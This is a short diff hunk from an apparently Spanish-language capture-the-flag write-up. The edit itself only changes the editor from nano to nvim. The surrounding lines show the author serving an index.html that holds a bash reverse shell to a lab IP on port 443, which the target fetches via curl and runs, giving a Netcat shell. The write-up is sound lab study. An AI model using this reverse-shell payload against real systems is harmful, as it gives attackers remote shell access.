@@ -70,7 +70,7 @@ Como podemos ejecutar comandos, primero verificamos si podemos hacernos una peti
 
 Lo que trata de hacer la maquina al momento de ejecutar el **Curl** es tratar de obtener un **index.html** del servidor web. Por lo que nos disponemos a hacer un archivo que contenga una ReverShell y asi con Netcat podemos ganar acceso al sistema 
 
-❯ **nano index.html**
+❯ **nvim index.html**
 	**#!/bin/bash**
 	**bash -i >& /dev/tcp/10.10.14.2/443 0>&1**
 
